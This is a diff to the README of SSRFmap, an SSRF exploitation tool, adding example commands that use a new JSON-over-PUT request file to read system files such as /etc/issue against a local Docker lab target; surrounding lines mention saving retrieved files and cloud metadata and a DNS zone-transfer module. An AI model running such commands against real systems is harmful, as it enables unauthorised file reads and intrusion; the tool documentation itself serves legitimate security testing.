@@ -186,6 +186,9 @@ uv run python ssrfmap.py -r examples/request7.txt -p url -m readfiles --rfiles /
 
 # reproduce a PUT SSRF while preserving the value prefix before *FUZZ*
 uv run python ssrfmap.py -r examples/request8.txt -p url -m readfiles --rfiles /etc/issue
+
+# reproduce SSRF with a JSON body sent via PUT; the injection parameter is url
+uv run python ssrfmap.py -r examples/request9.txt -p url -m readfiles --rfiles /etc/issue
 ```
 
 Retrieved files and cloud metadata are saved under `loot/<target>/`. The `loot/` directory is
@@ -212,6 +215,7 @@ docker exec -it example uv run --no-sync python ssrfmap.py -r examples/request5.
 docker exec -it example uv run --no-sync python ssrfmap.py -r examples/request6.txt -p X-Custom-Header -m readfiles --rfiles /etc/issue
 docker exec -it example uv run --no-sync python ssrfmap.py -r examples/request7.txt -p url -m readfiles --rfiles /etc/issue
 docker exec -it example uv run --no-sync python ssrfmap.py -r examples/request8.txt -p url -m readfiles --rfiles /etc/issue
+docker exec -it example uv run --no-sync python ssrfmap.py -r examples/request9.txt -p url -m readfiles --rfiles /etc/issue
 docker exec -it example uv run --no-sync python ssrfmap.py -r examples/request.txt -p url -m axfr
 docker exec -it example uv run --no-sync python ssrfmap.py -r examples/request3.txt -p url -m axfr --lhost 127.0.0.1 --lport 53 --ldomain example.lab
 
